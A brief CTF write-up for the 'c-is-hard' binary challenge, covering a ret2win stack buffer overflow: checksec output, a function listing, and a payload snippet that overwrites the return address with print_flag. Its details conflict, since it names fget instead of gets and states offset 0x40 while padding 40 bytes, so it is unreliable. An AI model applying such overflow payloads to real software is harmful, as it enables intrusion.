#c-is-hard
run `checksec` :
```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

see function :
```
0x0000000000401000  _init
0x0000000000401080  puts@plt
0x0000000000401090  printf@plt
0x00000000004010a0  fgets@plt
0x00000000004010b0  gets@plt
0x00000000004010c0  fopen@plt
0x00000000004010d0  _start
0x0000000000401100  _dl_relocate_static_pie
0x0000000000401110  deregister_tm_clones
0x0000000000401140  register_tm_clones
0x0000000000401180  __do_global_dtors_aux
0x00000000004011b0  frame_dummy
0x00000000004011b6  print_flag
0x000000000040121a  vuln
0x000000000040123a  main
0x0000000000401270  __libc_csu_init
0x00000000004012e0  __libc_csu_fini
0x00000000004012e8  _fini
```

The vulnerability is an obvious buffer overflow by `fget`, and you can see `print_flag` function.
Therefore, fill buffer and do buffer overflow and just return "print\_flag" address.

offset = 0x40 , print\_flag address = 0x4011b6

A part of [solve.py](https://github.com/1hPa/ctf-writeups/blob/master/2021/codeFest/c-is-hard/solve.py) :
```
payload = b"A"*40
payload += p64(0x4011b6)
```
